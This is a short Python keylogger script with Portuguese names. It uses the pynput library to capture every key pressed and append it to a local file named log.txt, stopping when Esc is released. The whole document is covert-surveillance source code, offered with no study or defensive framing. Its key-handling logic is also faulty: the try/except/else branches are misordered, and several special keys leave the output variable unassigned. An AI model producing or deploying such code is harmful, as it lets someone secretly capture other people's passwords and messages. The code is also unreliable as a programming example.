from pynput.keyboard import Key, Listener

ARQUIVO_LOG =   "log.txt"

def ao_pressionar(tecla):
    """Função chamada a cada tecla pressionada."""

    try: 
        comentario = str(tecla.char)
    except AttributeError:
        if tecla == Key.space:
            comentario = " "
        elif tecla == Key.enter: 
            comentario = "\n"
    else:
        comentario = f"[{tecla.name}]"


    with open(ARQUIVO_LOG, "a", encoding="utf-8") as arquivo: arquivo.write(comentario)

def ao_soltar(tecla):

    if tecla == Key.esc:
        return False 

with Listener(on_press=ao_pressionar, on_release=ao_soltar) as monitor: 
    monitor.join()